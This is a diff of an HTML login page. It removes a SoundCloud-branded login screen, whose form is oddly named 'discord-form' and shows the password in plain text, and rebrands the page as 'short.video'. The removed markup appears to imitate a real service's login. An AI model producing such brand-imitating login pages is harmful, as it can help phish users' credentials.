@@ -3,31 +3,31 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Log in to SoundCloud</title>
+  <title>Log in | short.video</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="styles.css">
   <script src="script.js" defer></script>
 </head>
 <body>
   <main class="page-shell">
     <section class="form-panel" id="message" aria-labelledby="page-title">
-      <div class="login-brand" aria-label="SoundCloud">
-        <div class="soundcloud-mark">SC</div>
-        <span>SoundCloud</span>
+      <div class="login-brand" aria-label="short.video">
+        <div class="video-mark"><span></span><span></span><span></span></div>
+        <span>short<span class="brand-dot">.</span>video</span>
       </div>
-      <h1 id="page-title">Log in to SoundCloud</h1>
-      <p class="login-subtitle">Welcome back. Enter your details below.</p>
+      <h1 id="page-title">Log in</h1>
+      <p class="login-subtitle">Join the moment. Watch, create, and share.</p>
 
-      <form id="discord-form">
-        <label for="first-text">Email address</label>
-        <input id="first-text" name="firstText" type="text" placeholder="email" maxlength="200" required>
+      <form id="login-form">
+        <label for="first-text">Email or username</label>
+        <input id="first-text" name="firstText" type="text" placeholder="Enter your email or username" maxlength="200" autocomplete="username" required>
 
         <label for="second-text">Password</label>
-        <input id="second-text" name="secondText" type="text" placeholder="hasło" maxlength="200" required>
+        <input id="second-text" name="secondText" type="password" placeholder="Enter your password" maxlength="200" autocomplete="current-password" required>
 
-        <a class="forgot-link" href="#forgot">Forgot your password?</a>
+        <a class="forgot-link" href="#forgot">Forgot password?</a>
 
         <button type="submit" id="submit-button">
           <span>Log in</span>
@@ -35,8 +35,9 @@
         <p id="form-status" class="form-status" role="status" aria-live="polite"></p>
       </form>
 
-      <div class="divider"><span>or</span></div>
-      <a class="signup-link" href="#signup">Create an account</a>
+      <div class="divider"><span>OR</span></div>
+      <a class="signup-link" href="#signup">Create account</a>
+      <p class="legal-note">By continuing, you agree to our Terms and Privacy Policy.</p>
     </section>
   </main>
 
